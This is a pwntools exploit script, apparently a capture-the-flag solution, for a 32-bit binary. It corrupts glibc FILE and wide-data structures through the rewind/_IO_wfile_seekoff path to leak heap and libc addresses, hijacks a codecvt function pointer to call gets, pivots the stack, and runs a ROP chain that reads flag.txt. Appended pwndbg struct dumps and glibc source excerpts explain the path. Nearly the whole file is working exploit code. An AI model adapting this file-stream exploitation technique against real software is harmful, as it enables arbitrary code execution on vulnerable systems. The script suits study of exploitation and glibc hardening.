#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

gdbscript = '''
dir ./glibc-2.41
# b rewind
# b do_write
b main
brva 0x1A90
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper

@trace
def write(offset, data):
    index = len(data)
    sla(b'> \n', b'1')
    sla(b'Index: ', str(index).encode())
    sla(b'Offset: ', str(offset).encode())
    sla(b'Data: ', data)

@trace
def rewind():
    sla(b'> \n', b'2')

def bit_not(n, numbits=8):
    return (1 << numbits) - 1 - n

_IO_NO_WRITES         = 0x0008 # /* Writing not allowed.  */
_IO_CURRENTLY_PUTTING = 0x0800
_IO_IS_APPENDING      = 0x1000


info("allocate buffers")
rewind()


info("prepare for a leak")

write(0x38, p8(constants.STDOUT_FILENO)) # set _fileno to stdout

write(0x0, flat(
    p8(0x88 & bit_not(_IO_NO_WRITES)), # remove _IO_NO_WRITES from flags bypass check in `_IO_wfile_overflow`
    p8(0x24 | ((_IO_CURRENTLY_PUTTING | _IO_IS_APPENDING) & 0xFF00) >> 8), # add _IO_CURRENTLY_PUTTING to flags; _IO_IS_APPENDING to enter if in `new_do_write`
))

write(0xb4, p8(0x40)) # change _wide_data->_IO_write_ptr; to enter `_IO_WOVERFLOW` in `_IO_switch_to_wget_mode`

# 4 bit bruteforce
bruteforced_4b = 0xc << 12
write(0x10, p16(bruteforced_4b | 0x008)) # change _IO_write_base; controls pointer to data that would be written to stdout

info("leaking heap and libc addresses via: rewind -> _IO_wfile_seekoff -> _IO_switch_to_wget_mode -> _IO_wfile_overflow -> _IO_do_flush -> _IO_wdo_write -> _IO_new_do_write -> new_do_write -> _IO_SYSWRITE")
rewind()

leak = r(0x230)
leak = unpack_many(leak, word_size=32)

for idx, val in enumerate(leak):
    debug(f"leak[{idx}]: {val:#x}")

heap_leak = leak[104]
libc_leak = leak[139]
success(f"heap_leak: {heap_leak:#x}")
success(f"libc_leak: {libc_leak:#x}")

heap_base = heap_leak - 0x3f0
libc_base = libc_leak - 0x23c90c
success(f"heap_base: {heap_base:#x}")
success(f"libc_base: {libc_base:#x}")

libc.address = libc_base
ld_base = libc.address + 0x252000

info("prepare for calling gets into heap via: rewind -> _IO_wfile_seekoff -> _IO_switch_to_wget_mode -> _IO_wfile_overflow -> _IO_do_flush -> _IO_wdo_write -> __libio_codecvt_out -> DL_CALL_FCT (fct) -> gets")

write(0x0, flat(
    p8(0x88 & bit_not(_IO_NO_WRITES)), # remove _IO_NO_WRITES from flags bypass check in `_IO_wfile_overflow`
    p8(0x24 | ((_IO_CURRENTLY_PUTTING | _IO_IS_APPENDING) & 0xFF00) >> 8), # add _IO_CURRENTLY_PUTTING to flags;    _IO_IS_APPENDING to enter if in `new_do_write`
))

write(0xb4, p8(0x40)) # change _wide_data->_IO_write_ptr; to enter `_IO_WOVERFLOW` in `_IO_switch_to_wget_mode`
write(0x54, p8(0x80-36)) # struct _IO_codecvt *_codecvt; make __cd_in to be __cd_out; because it is too far to overwrite

unused = heap_base + 0x198
# write(4, 0xe0, p32(unused)) # __cd_in->step, eax when call ebx is executed
write(0xe0, pack(unused & 0xFFFFFF, word_size=24)) # write4 as two write3
write(0xe1, pack(unused >> 8, word_size=24)) # write4 as two write3

write(0xc, p32(libc.sym.gets)) # __cd_in->step->__fct

info("call gets")
rewind()


info("prepare a FILE struct to pivot stack and call gets to write to stack (heap)")

unused = heap_base + 0x21c
ld_g2 = 0x00001580 #: xchg esp, edx; xor bh, bh; call dword ptr [eax-0x73];

pld = flat({
  4: 0x141,                              # chunk size
}, filler=b'\x00') + flat({
  0: 0xfbad2c80,                         # _flags; no _IO_CURRENTLY_PUTTING flag set, to enter `_IO_do_flush` in `_IO_wfile_overflow`
  4: heap_base + 0x3f0,                  # _IO_read_ptr
  0x10: heap_base + 0x3f0,               # _IO_write_base
  0x14: heap_base + 0x254-1,             # _IO_write_ptr; subtract less to set up `buf` ptr in `gets` function; then `_IO_getline` will overwrite return address to gets
  0x18: heap_base + 0x13f0,              # _IO_write_end
  0x1c: heap_base + 0x3f0,               # _IO_buf_base
  0x20: heap_base + 0x13f0,              # _IO_buf_end
  0x34: libc.sym['_IO_2_1_stdin_'],      # struct _IO_FILE *_chain
  0x38: 1,                               # _fileno
  0x3c: 1,                               # _flags2
  0x48: heap_base + 0x238,               # _lock
  0x54: heap_base + 0x280,               # _codecvt
  0x58: heap_base + 0x244,               # _wide_data
  0x68: 1,                               # _mode
  0x94: libc.address + 0x23c90c,         # vtable

  # struct _IO_wide_data *_wide_data
  0xa4: heap_base + 0x1400,              # _IO_read_ptr
  0xa8: heap_base + 0x1400,              # _IO_read_end
  0xac: heap_base + 0x1400,              # _IO_read_base
  0xb0: heap_base + 0x1400,              # _IO_write_base
  0xb4: heap_base + 0x1400 + 0x40,       # _IO_write_ptr; add 0x40 to enter `_IO_WOVERFLOW` in `_IO_switch_to_wget_mode`
  0xb8: heap_base + 0x1400,              # _IO_write_end
  0xbc: heap_base + 0x1400,              # _IO_buf_base
  0xc0: heap_base + 0x5400,              # _IO_buf_end

  0x104: unused,                         # __cd_out->step, eax when call ebx is executed
  0x90: ld_base + ld_g2,                 # __cd_out->step->__fct

  0x9: libc.sym.gets,                    # call dword ptr [eax-0x73]; eax-0x73 points here
}, filler=b'\x00')

if b'\n' in pld:
    raise Exception("newline in payload")

sl(pld)

info("writing to stack")
rewind()

rop = ROP(libc, base=(heap_base & 0xFFFF0000) | bruteforced_4b | 0x254)
rop.call(libc.sym.open, [b'./flag.txt\x00', 0, 0])
rop.call(libc.sym.read, [4, heap_base + 0x2000, 0x80])
rop.call(libc.sym.write, [1, heap_base + 0x2000, 0x80])
rop.call(libc.sym._exit, [0])
debug(rop.dump())


info("final rop")
sl(flat(
    b'A',
    rop.chain(),
))

ia()

"""
pwndbg> ptype /o struct _IO_FILE
/* offset      |    size */  type = struct _IO_FILE {
/*      0      |       4 */    int _flags;
/*      4      |       4 */    char *_IO_read_ptr;
/*      8      |       4 */    char *_IO_read_end;
/*     12      |       4 */    char *_IO_read_base;
/*     16      |       4 */    char *_IO_write_base;
/*     20      |       4 */    char *_IO_write_ptr;
/*     24      |       4 */    char *_IO_write_end;
/*     28      |       4 */    char *_IO_buf_base;
/*     32      |       4 */    char *_IO_buf_end;
/*     36      |       4 */    char *_IO_save_base;
/*     40      |       4 */    char *_IO_backup_base;
/*     44      |       4 */    char *_IO_save_end;
/*     48      |       4 */    struct _IO_marker *_markers;
/*     52      |       4 */    struct _IO_FILE *_chain;
/*     56      |       4 */    int _fileno;
/*     60      |       4 */    int _flags2;
/*     64      |       4 */    __off_t _old_offset;
/*     68      |       2 */    unsigned short _cur_column;
/*     70      |       1 */    signed char _vtable_offset;
/*     71      |       1 */    char _shortbuf[1];
/*     72      |       4 */    _IO_lock_t *_lock;
/*     76      |       8 */    __off64_t _offset;
/*     84      |       4 */    struct _IO_codecvt *_codecvt;
/*     88      |       4 */    struct _IO_wide_data *_wide_data;
/*     92      |       4 */    struct _IO_FILE *_freeres_list;
/*     96      |       4 */    void *_freeres_buf;
/*    100      |       4 */    size_t __pad5;
/*    104      |       4 */    int _mode;
/*    108      |      40 */    char _unused2[40];

                               /* total size (bytes):  148 */
                             }


pwndbg> ptype /o struct _IO_wide_data
/* offset      |    size */  type = struct _IO_wide_data {
/*      0      |       4 */    wchar_t *_IO_read_ptr;
/*      4      |       4 */    wchar_t *_IO_read_end;
/*      8      |       4 */    wchar_t *_IO_read_base;
/*     12      |       4 */    wchar_t *_IO_write_base;
/*     16      |       4 */    wchar_t *_IO_write_ptr;
/*     20      |       4 */    wchar_t *_IO_write_end;
/*     24      |       4 */    wchar_t *_IO_buf_base;
/*     28      |       4 */    wchar_t *_IO_buf_end;
/*     32      |       4 */    wchar_t *_IO_save_base;
/*     36      |       4 */    wchar_t *_IO_backup_base;
/*     40      |       4 */    wchar_t *_IO_save_end;
/*     44      |       8 */    __mbstate_t _IO_state;
/*     52      |       8 */    __mbstate_t _IO_last_state;
/*     60      |      72 */    struct _IO_codecvt {
/*     60      |      36 */        _IO_iconv_t __cd_in;
/*     96      |      36 */        _IO_iconv_t __cd_out;

                                   /* total size (bytes):   72 */
                               } _codecvt;
/*    132      |       4 */    wchar_t _shortbuf[1];
/*    136      |       4 */    const struct _IO_jump_t *_wide_vtable;

                               /* total size (bytes):  140 */

                               
pwndbg> ptype /o struct __gconv_step
/* offset      |    size */  type = struct __gconv_step {
/*      0      |       4 */    struct __gconv_loaded_object *__shlib_handle;
/*      4      |       4 */    const char *__modname;
/*      8      |       4 */    int __counter;
/*     12      |       4 */    char *__from_name;
/*     16      |       4 */    char *__to_name;
/*     20      |       4 */    __gconv_fct __fct;
/*     24      |       4 */    __gconv_btowc_fct __btowc_fct;
/*     28      |       4 */    __gconv_init_fct __init_fct;
/*     32      |       4 */    __gconv_end_fct __end_fct;
/*     36      |       4 */    int __min_needed_from;
/*     40      |       4 */    int __max_needed_from;
/*     44      |       4 */    int __min_needed_to;
/*     48      |       4 */    int __max_needed_to;
/*     52      |       4 */    int __stateful;
/*     56      |       4 */    void *__data;

                               /* total size (bytes):   60 */
}


pwndbg> ptype /o _IO_iconv_t
type = struct {
/*      0      |       4 */    struct __gconv_step *step;
/*      4      |      32 */    struct __gconv_step_data {
/*      4      |       4 */        unsigned char *__outbuf;
/*      8      |       4 */        unsigned char *__outbufend;
/*     12      |       4 */        int __flags;
/*     16      |       4 */        int __invocation_counter;
/*     20      |       4 */        int __internal_use;
/*     24      |       4 */        __mbstate_t *__statep;
/*     28      |       8 */        __mbstate_t __state;

                                   /* total size (bytes):   32 */
                               } step_data;

                               /* total size (bytes):   36 */
                             }
                             
                             """

"""
/*
_IO_wfile_seekoff

  bool was_writing = ((fp->_wide_data->_IO_write_ptr
		       > fp->_wide_data->_IO_write_base)
		      || _IO_in_put_mode (fp));

  if (was_writing && _IO_switch_to_wget_mode (fp))
    return WEOF;


_IO_switch_to_wget_mode (FILE *fp)
{
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)
      return EOF;

*/


wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0
      || f->_wide_data->_IO_write_base == NULL)
    {
    ...
    }
  if (wch == WEOF)
    return _IO_do_flush (f);


#define _IO_do_flush(_f) \
  ((_f)->_mode <= 0							      \
   ? _IO_do_write(_f, (_f)->_IO_write_base,				      \
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \
		   ((_f)->_wide_data->_IO_write_ptr			      \
		    - (_f)->_wide_data->_IO_write_base)))


_IO_wdo_write (FILE *fp, const wchar_t *data, size_t to_do)
{
  struct _IO_codecvt *cc = fp->_codecvt;

  if (to_do > 0)
    {
      if (fp->_IO_write_end == fp->_IO_write_ptr
	  && fp->_IO_write_end != fp->_IO_write_base)
	{
	  if (_IO_new_do_write (fp, fp->_IO_write_base,
				fp->_IO_write_ptr - fp->_IO_write_base) == EOF)
	    return WEOF;
	}

    
_IO_new_do_write (FILE *fp, const char *data, size_t to_do)
{
  return (to_do == 0
	  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)

static size_t
new_do_write (FILE *fp, const char *data, size_t to_do)
{
  size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
		       ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}
"""


